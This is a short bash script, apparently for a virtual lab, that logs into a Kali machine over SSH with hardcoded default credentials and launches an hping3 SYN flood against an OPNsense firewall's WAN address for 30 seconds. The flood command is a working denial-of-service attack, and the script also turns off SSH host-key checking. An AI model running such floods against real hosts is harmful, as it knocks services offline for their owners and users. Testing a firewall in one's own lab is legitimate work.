#!/bin/bash

KALI_IP="10.0.2.5"
KALI_USER="kali"
KALI_PASS="kali"

OPNSENSE_WAN_IP="10.0.2.4" 

SOCKET_DIR="/tmp"
SOCK_KALI="$SOCKET_DIR/mux_kali.sock"

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

print_step() { echo -e "\n${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[SUCCESS] $1${NC}"; }

open_connection() {
    local USER=$1; local IP=$2; local PASS=$3; local SOCK=$4
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -M -S "$SOCK" -f -N "$USER@$IP"
}
close_connection() {
    local USER=$1; local IP=$2; local SOCK=$3
    [ -S "$SOCK" ] && ssh -S "$SOCK" -O exit "$USER@$IP" >/dev/null 2>&1
    rm -f "$SOCK"
}
trap "close_connection $KALI_USER $KALI_IP $SOCK_KALI; close_connection $UBUNTU_USER $UBUNTU_IP $SOCK_UBUNTU" EXIT

# 1. Проверка соединения
rm -f "$SOCK_KALI" "$SOCK_UBUNTU"
print_step "Установка соединений..."
open_connection "$KALI_USER" "$KALI_IP" "$KALI_PASS" "$SOCK_KALI"

# 2. Запуск атаки
print_step "Запуск атаки SYN FLOOD"
CMD_FLOOD="echo '$KALI_PASS' | sudo -S nohup hping3 -S -p 80 -c 10000 --faster $OPNSENSE_WAN_IP > /dev/null 2>&1 & echo \$!"
HPING_PID=$(ssh -S "$SOCK_KALI" "$KALI_USER@$KALI_IP" "$CMD_FLOOD")

echo "Атака началась"

sleep 30

echo "Атака завершена"
